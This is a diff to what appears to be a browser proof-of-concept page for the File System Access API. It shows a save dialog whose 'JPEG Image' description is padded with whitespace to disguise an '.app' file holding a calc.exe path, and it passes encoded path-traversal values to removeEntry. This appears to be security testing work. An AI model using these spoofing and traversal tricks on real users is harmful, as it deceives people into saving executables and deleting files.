@@ -49,7 +49,7 @@
                             description:
                                 'JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         ',
                             accept: {
-                                'text/plain': ['.bat']
+                                'text/plain': ['.........app']
                             },
                             content: 'C:\\Windows\\system32\\calc.exe'
                         }
@@ -71,12 +71,12 @@
 
               // Deleting is done via 'removeEntry'. Here, we're deleting
               // our newly created empty txt-file.
-              await dirHandle.removeEntry('../poc');
+              await dirHandle.removeEntry('..%2fpoc');
 
               // And for demo purposees, let's also delete the new
               // directory itself and any of its contents (which at
               // this point don't exist as the only file got just deleted).
-              await dirHandle.removeEntry('sss/../test', { recursive: true });
+              await dirHandle.removeEntry('test', { recursive: true });
         }
 
             const createNewFile = document.getElementById('createNewFile')
